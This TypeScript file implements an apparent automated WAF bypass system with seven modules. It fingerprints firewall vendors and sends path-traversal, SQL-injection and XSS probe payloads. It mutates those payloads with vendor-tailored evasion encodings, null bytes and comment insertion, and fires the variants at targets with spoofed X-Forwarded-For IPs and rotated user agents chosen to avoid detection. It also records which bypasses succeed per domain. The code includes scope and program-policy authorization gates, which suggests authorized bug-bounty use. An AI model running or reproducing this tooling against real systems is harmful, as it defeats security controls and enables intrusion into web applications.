/**
 * WAF Bypass System – 7-Module Architecture
 * Module 1: WAF Detection
 * Module 2: Fingerprint Analyzer
 * Module 3: Evasion Technique Library
 * Module 4: Bypass Executor
 * Module 5: Rule Correlation Matrix
 * Module 6: Cross-Session Vendor Profiles
 * Module 7: Intelligence Synthesizer
 */
import { scopedHttp } from "../lib/net/scoped-http";
import { db } from "../db";
import { wafProfiles, programs } from "../db/schema";
import { eq, and } from "drizzle-orm";
import logger from "../utils/logger";
import { temporalDecay } from "../lib/hunter/temporal-decay";
import { stealthCoordinator } from "../lib/stealth";
import { AIWAFEvasion } from "../lib/stealth/ai-waf-evasion";
import { ScopeGuard } from "../middleware/scopeGuard";
import { isActionAllowed } from "./ActionPolicyGate";

const aiWAFEvasion = new AIWAFEvasion();

export interface WAFDetectionResult {
  detected: boolean;
  vendor: string;
  confidence: number;
  signals: string[];
}

export interface EvasionResult {
  technique: string;
  payload: string;
  success: boolean;
  blockRate: number;
}

export interface UnifiedIntelligence {
  vendor: string;
  detectionConfidence: number;
  recommendedTechniques: EvasionResult[];
  ruleCorrelations: Record<string, string[]>;
  vendorProfile: VendorEvasionProfile;
  temporalDecayScore: number;
  conflictFlags: string[];
}

interface VendorEvasionProfile {
  vendor: string;
  totalAttempts: number;
  successfulBypasses: number;
  techniques: Record<string, { success: number; total: number; lastUsed: number }>;
  blockedPatterns: string[];
}

// ── Module 1: WAF Detection ──────────────────────────────────────────────────
export class WAFDetector {
  private static readonly WAF_SIGNATURES: Record<string, RegExp[]> = {
    cloudflare: [/cloudflare/i, /cf-ray/i, /__cfduid/i],
    akamai: [/akamai/i, /ak_bmsc/i, /bm_sz/i],
    aws_waf: [/awswaf/i, /x-amzn-requestid/i],
    imperva: [/imperva/i, /incap_ses/i, /visid_incap/i],
    sucuri: [/sucuri/i, /x-sucuri/i],
    barracuda: [/barracuda/i, /barra_counter_session/i],
    f5_big_ip: [/f5-asp/i, /bigip/i, /ts_ref/i],
    fortiweb: [/fortigate/i, /fortiweb/i, /fgd_allow/i],
    modsecurity: [/mod_security/i, /modsecurity/i],
    wordfence: [/wordfence/i, /wfwaf/i],
    generic: [/waf/i, /security/i, /blocked/i, /forbidden.*attack/i],
  };

  async detect(url: string, response?: { status: number; headers: Record<string, string>; body: string }, programId?: number): Promise<WAFDetectionResult> {
    if (!response) {
      try {
        const resp = await scopedHttp.get(url, { timeout: 5000, validateStatus: () => true }, programId);
        response = {
          status: resp.status,
          headers: resp.headers as Record<string, string>,
          body: typeof resp.data === "string" ? resp.data : JSON.stringify(resp.data),
        };
      } catch {
        return { detected: false, vendor: "unknown", confidence: 0, signals: [] };
      }
    }

    const signals: string[] = [];
    let bestVendor = "unknown";
    let bestScore = 0;
    const headerStr = JSON.stringify(response.headers).toLowerCase();
    const bodyStr = (response.body || "").toLowerCase();

    // Check for 403/406/419/429 block codes
    if ([403, 406, 419, 429, 503].includes(response.status)) {
      signals.push(`block_status_code:${response.status}`);
    }

    for (const [vendor, patterns] of Object.entries(WAFDetector.WAF_SIGNATURES)) {
      let score = 0;
      for (const pattern of patterns) {
        if (pattern.test(headerStr) || pattern.test(bodyStr)) {
          score++;
          signals.push(`${vendor}:${pattern.source}`);
        }
      }
      if (score > bestScore) {
        bestScore = score;
        bestVendor = vendor;
      }
    }

    const confidence = Math.min(bestScore / 3, 1.0);
    return {
      detected: confidence > 0.3,
      vendor: bestVendor,
      confidence,
      signals,
    };
  }
}

// ── Module 2: Fingerprint Analyzer ───────────────────────────────────────────
export class WAFFingerprinter {
  async fingerprint(url: string, programId?: number): Promise<{ waf: WAFDetectionResult; techStack: string[] }> {
    const detector = new WAFDetector();
    const probes = [
      { path: "/../../etc/passwd", desc: "path_traversal" },
      { path: "/?id=1 UNION SELECT 1--", desc: "sqli_probe" },
      { path: "/?q=<script>alert(1)</script>", desc: "xss_probe" },
      { path: "/admin/", desc: "admin_panel" },
    ];

    const waf = await detector.detect(url, undefined, programId);
    const techStack: string[] = [];

    for (const probe of probes.slice(0, 2)) {
      try {
        const resp = await scopedHttp.get(`${url}${probe.path}`, {
          timeout: 3000,
          validateStatus: () => true,
          headers: { "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36" },
        }, programId);
        const headers = resp.headers as Record<string, string>;
        if (headers["x-powered-by"]) techStack.push(headers["x-powered-by"]);
        if (headers["server"]) techStack.push(headers["server"]);
      } catch { /* timeout is also a signal */ }
    }

    return { waf, techStack: [...new Set(techStack)] };
  }
}

// ── Module 3: Evasion Technique Library ──────────────────────────────────────
export class EvasionLibrary {
  static readonly TECHNIQUES: Record<string, (payload: string) => string[]> = {
    url_encoding: (p) => [encodeURIComponent(p), p.split("").map(c => `%${c.charCodeAt(0).toString(16)}`).join("")],
    double_encoding: (p) => [encodeURIComponent(encodeURIComponent(p))],
    unicode_bypass: (p) => [p.replace(/</g, "\u003c").replace(/>/g, "\u003e").replace(/'/g, "\u0027")],
    case_variation: (p) => [p.toUpperCase(), p.toLowerCase(), p.split("").map((c, i) => i % 2 ? c.toUpperCase() : c.toLowerCase()).join("")],
    comment_insertion: (p) => [`${p.slice(0, 3)}/**/` + p.slice(3), p.replace(/ /g, "/**/")],
    null_byte: (p) => [`${p}\x00`, `\x00${p}`],
    whitespace_variants: (p) => [p.replace(/ /g, "\t"), p.replace(/ /g, "\r\n"), p.replace(/ /g, "+")],
    json_unicode: (p) => [JSON.stringify(p).slice(1, -1)],
    // NOTE: chunked_transfer and header_manipulation were removed — they are
    // transport/header-level techniques, not payload transforms. As string
    // mutations they returned the payload unchanged, which fired raw payloads
    // while falsely reporting an evasion variant. Header rotation is handled in
    // the request layer (BypassExecutor); chunked transfer is not yet supported.
  };

  generateVariants(payload: string, techniques: string[]): Array<{ technique: string; payload: string }> {
    const variants: Array<{ technique: string; payload: string }> = [];
    for (const technique of techniques) {
      const fn = EvasionLibrary.TECHNIQUES[technique];
      if (fn) {
        for (const variant of fn(payload)) {
          variants.push({ technique, payload: variant });
        }
      }
    }
    return variants;
  }

  recommendTechniques(vendor: string): string[] {
    const vendorMap: Record<string, string[]> = {
      cloudflare: ["url_encoding", "unicode_bypass", "case_variation", "whitespace_variants"],
      akamai: ["comment_insertion", "null_byte", "url_encoding", "case_variation"],
      aws_waf: ["unicode_bypass", "json_unicode", "whitespace_variants"],
      imperva: ["double_encoding", "comment_insertion", "null_byte"],
      modsecurity: ["case_variation", "url_encoding", "comment_insertion", "whitespace_variants"],
      generic: ["url_encoding", "case_variation", "unicode_bypass"],
    };
    return vendorMap[vendor] || vendorMap["generic"];
  }
}

// ── Module 4: Bypass Executor ─────────────────────────────────────────────────
export class BypassExecutor {
  async execute(
    url: string,
    payload: string,
    technique: string,
    options: { method?: string; paramName?: string } = {},
    programId?: number
  ): Promise<EvasionResult> {
    const method = options.method || "GET";
    const paramName = options.paramName || "q";
    const start = Date.now();

    try {
      const resp = await scopedHttp.request({
        method,
        url: `${url}?${paramName}=${payload}`,
        timeout: 5000,
        validateStatus: () => true,
        headers: this.rotateHeaders(),
      }, programId);

      const blocked = [403, 406, 429, 503].includes(resp.status) ||
        /blocked|forbidden|security|waf/i.test(JSON.stringify(resp.data));

      return {
        technique,
        payload,
        success: !blocked && resp.status < 400,
        blockRate: blocked ? 1.0 : 0.0,
      };
    } catch {
      return { technique, payload, success: false, blockRate: 1.0 };
    }
  }

  private rotateHeaders(): Record<string, string> {
    const agents = [
      "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/120.0",
      "Mozilla/5.0 (Windows NT 10.0; Win64; x64) Gecko/20100101 Firefox/121.0",
      "curl/7.88.1",
      "python-requests/2.31.0",
    ];
    // Generate a plausible public IPv4: all four octets randomized (1–254),
    // avoiding the tell-tale fixed ".0.1" suffix that flags spoofed traffic.
    const octet = () => 1 + Math.floor(Math.random() * 254);
    return {
      "User-Agent": agents[Math.floor(Math.random() * agents.length)],
      "X-Forwarded-For": `${octet()}.${octet()}.${octet()}.${octet()}`,
      "Accept": "text/html,application/xhtml+xml,*/*",
    };
  }
}

// ── Module 5: Rule Correlation Matrix ────────────────────────────────────────
export class RuleCorrelationMatrix {
  private matrix: Map<string, Set<string>> = new Map();

  observe(technique: string, blockedPayload: string, category: string): void {
    if (!this.matrix.has(category)) this.matrix.set(category, new Set());
    this.matrix.get(category)!.add(technique);
  }

  getCorrelations(): Record<string, string[]> {
    const result: Record<string, string[]> = {};
    for (const [cat, techs] of this.matrix.entries()) {
      result[cat] = [...techs];
    }
    return result;
  }

  sharedRules(categoryA: string, categoryB: string): string[] {
    const a = this.matrix.get(categoryA) || new Set<string>();
    const b = this.matrix.get(categoryB) || new Set<string>();
    return [...a].filter(x => b.has(x));
  }
}

// ── Module 6: Cross-Session Vendor Evasion Profiles ──────────────────────────
export class VendorEvasionProfiles {
  async getProfile(vendor: string, domain: string): Promise<VendorEvasionProfile> {
    const [profile] = await db.select().from(wafProfiles)
      .where(and(eq(wafProfiles.vendor, vendor), eq(wafProfiles.targetDomain, domain)))
      .limit(1);

    if (profile) return profile.evasionMatrix as VendorEvasionProfile;
    return { vendor, totalAttempts: 0, successfulBypasses: 0, techniques: {}, blockedPatterns: [] };
  }

  async updateProfile(vendor: string, domain: string, result: EvasionResult): Promise<void> {
    const profile = await this.getProfile(vendor, domain);
    profile.totalAttempts++;
    if (result.success) profile.successfulBypasses++;

    if (!profile.techniques[result.technique]) {
      profile.techniques[result.technique] = { success: 0, total: 0, lastUsed: Date.now() };
    }
    profile.techniques[result.technique].total++;
    if (result.success) profile.techniques[result.technique].success++;
    profile.techniques[result.technique].lastUsed = Date.now();

    await db.insert(wafProfiles).values({
      vendor,
      targetDomain: domain,
      evasionMatrix: profile,
      successfulBypasses: profile.successfulBypasses,
    }).onConflictDoUpdate({
      target: [wafProfiles.vendor, wafProfiles.targetDomain],
      set: {
        evasionMatrix: profile,
        successfulBypasses: profile.successfulBypasses,
        lastUpdated: new Date(),
      },
    });
  }
}

// ── Shared authorization gate ────────────────────────────────────────────────
// Fail-closed scope + program-policy check, no HTTP traffic to the target
// itself. Exported so ANY caller that wants to use WAF-evasion techniques
// (EvasionLibrary specifically) goes through this exact check, rather than
// calling EvasionLibrary as a "peer" that bypasses it — EvasionLibrary is a
// component this gate protects, not a standalone utility. A second,
// independently-written copy of an authorization check is how an auth gate
// drifts and eventually fails open; there is exactly one copy of this logic.
//
// Deliberately does NOT re-run fingerprint()/generateVariants() — those are
// the expensive part (a live HTTP fingerprint call, then up to 5 real bypass-
// probe requests). A caller that already has a vendor from an earlier
// synthesize() call in the same hunt (e.g. a later gray-zone retry re-using
// OBSERVE-time detection) can re-verify authorization freshly and cheaply
// through this function without re-paying for detection every time.
export async function checkWafBypassAuthorization(
  url: string, programId?: number
): Promise<{ allowed: boolean; reason?: string }> {
  // 2026-07-21 readiness pass (item D): fail CLOSED on both "no programId"
  // and an unset/"unspecified" program policy — the caller must supply a
  // real programId, and the program must have EXPLICITLY set
  // wafBypassPolicy to "allowed", not merely have failed to say "disallowed".
  // 2026-07-23 (blocker #3): the lab/real + policy-string decision is now
  // the SHARED isActionAllowed() gate (ActionPolicyGate.ts) — this function
  // keeps its own scope-check (a question the shared gate doesn't answer),
  // external behavior unchanged.
  if (programId === undefined) {
    logger.warn('WAFBypass authorization blocked — no programId supplied (fail-closed default)', { url });
    return { allowed: false, reason: 'No programId supplied — cannot authorize without a known program' };
  }

  const scopeGuard = ScopeGuard.getInstance();
  const { allowed, reason } = await scopeGuard.isInScope(url, programId);
  if (!allowed) {
    logger.warn('WAFBypass authorization blocked by scope guard', { url, programId, reason });
    return { allowed: false, reason: `Out of scope: ${reason}` };
  }

  const [program] = await db.select({ isLab: programs.isLab, wafBypassPolicy: programs.wafBypassPolicy })
    .from(programs).where(eq(programs.id, programId)).limit(1);
  if (!program) {
    return { allowed: false, reason: `Program ${programId} not found` };
  }

  return isActionAllowed(program, program.wafBypassPolicy, "waf_bypass");
}

// ── Module 7: Intelligence Synthesizer ───────────────────────────────────────
export class IntelligenceSynthesizer {
  private detector = new WAFDetector();
  private fingerprinter = new WAFFingerprinter();
  private library = new EvasionLibrary();
  private executor = new BypassExecutor();
  private correlations = new RuleCorrelationMatrix();
  private vendorProfiles = new VendorEvasionProfiles();

  async synthesize(url: string, payload: string, sessionId = 'default', programId?: number): Promise<UnifiedIntelligence> {
    const domain = new URL(url).hostname;

    const auth = await checkWafBypassAuthorization(url, programId);
    if (!auth.allowed) throw new Error(auth.reason);

    const { waf } = await this.fingerprinter.fingerprint(url, programId);
    const recommendedTechs = this.library.recommendTechniques(waf.vendor);
    const libraryVariants = this.library.generateVariants(payload, recommendedTechs);
    const vendorProfile = await this.vendorProfiles.getProfile(waf.vendor, domain);

    // Detect vuln class from payload heuristic for AI semantic map selection
    const vulnClass = /union.*select|select.*from|'\s*or\s*'/i.test(payload) ? 'sqli'
      : /<|onerror|javascript:|alert\(/i.test(payload) ? 'xss'
      : /\{\{|{%/i.test(payload) ? 'ssti'
      : 'generic';

    // Merge library variants with AI-WAF semantic variants, dedup by payload,
    // sort by confidence descending so the top-5 are highest-confidence attempts
    const aiRaw = aiWAFEvasion.generateVariants(payload, vulnClass);
    const aiVariants = aiRaw.map(v => ({ technique: v.technique, payload: v.mutatedPayload }));
    const seen = new Set<string>();
    const variants = [...libraryVariants, ...aiVariants].filter(v => {
      if (seen.has(v.payload)) return false;
      seen.add(v.payload);
      return true;
    });

    // Execute bypass attempts (limited to 5 to avoid detection). Bypass-technique
    // probing only makes sense when a WAF was actually fingerprinted — on a
    // no-WAF target (e.g. local dev/lab) this loop was still running up to 5
    // HTTP round-trips plus per-attempt stealth-pacing delays, which is what
    // pushed waf_intel to the full 30s ceiling every hunt against localhost.
    const results: EvasionResult[] = [];
    // This loop is fingerprinting, not the actual attack — it must never inherit
    // full hunt-level stealth pacing (which can recommend many-second delays once
    // a session has accrued backoff state). Budget it independently so a decayed
    // pacer state can't drag waf_intel back up toward the 30s outer ceiling.
    const SYNTHESIZE_BUDGET_MS = 8000;
    const loopStart = Date.now();
    if (waf.detected) {
      for (const variant of variants.slice(0, 5)) {
        if (Date.now() - loopStart > SYNTHESIZE_BUDGET_MS) {
          logger.info("WAF Intelligence: bypass-probe budget exhausted — stopping early", { url, attempted: results.length });
          break;
        }
        // Get timing recommendation from decay engine before each attempt
        const probe = await stealthCoordinator.prepareProbe(
          `${url}?q=${encodeURIComponent(variant.payload)}`,
          variant.payload,
          'waf_bypass',
          { sessionId, domain, vendor: waf.vendor, stealthMode: 'balanced' }
        );
        const remaining = SYNTHESIZE_BUDGET_MS - (Date.now() - loopStart);
        if (probe.delayMs > 0 && remaining > 0) {
          await new Promise(resolve => setTimeout(resolve, Math.min(probe.delayMs, remaining)));
        }

        const result = await this.executor.execute(url, variant.payload, variant.technique, {}, programId);
        results.push(result);
        await this.vendorProfiles.updateProfile(waf.vendor, domain, result);

        // Record outcome in decay engine — use blockRate not success; a 404 is not a WAF block
        stealthCoordinator.recordOutcome(sessionId, domain, waf.vendor, result.blockRate < 0.5, variant.technique);
      }
    } else {
      logger.info("WAF Intelligence: no WAF fingerprinted — skipping bypass-technique probing", { url });
    }

    // Use TemporalDecayEngine for accurate decay state (replaces manual 7-day calc)
    const decayState = temporalDecay.getDecayState(sessionId, domain, waf.vendor);
    const decayScore = 1 - decayState.estimatedAnomalyScore;

    // Conflict detection: template override vs empirical
    const conflictFlags: string[] = [];
    const empiricalBestTech = Object.entries(vendorProfile.techniques)
      .sort((a, b) => (b[1].success / b[1].total) - (a[1].success / a[1].total))[0]?.[0];
    if (empiricalBestTech && !recommendedTechs.includes(empiricalBestTech)) {
      conflictFlags.push(`Template recommends ${recommendedTechs[0]} but empirical data favors ${empiricalBestTech}`);
    }
    if (decayState.inRecoveryWindow) {
      conflictFlags.push(`In recovery window: anomaly=${decayState.estimatedAnomalyScore.toFixed(2)}, wait=${Math.round(decayState.recommendedWaitMs / 1000)}s`);
    }

    logger.info("WAF Intelligence Synthesized", {
      url, vendor: waf.vendor, confidence: waf.confidence,
      successfulBypasses: results.filter(r => r.success).length,
      anomalyScore: decayState.estimatedAnomalyScore,
      decayProgress: decayState.decayProgress,
    });

    return {
      vendor: waf.vendor,
      detectionConfidence: waf.confidence,
      recommendedTechniques: results,
      ruleCorrelations: this.correlations.getCorrelations(),
      vendorProfile,
      temporalDecayScore: decayScore,
      conflictFlags,
    };
  }
}

export default IntelligenceSynthesizer;
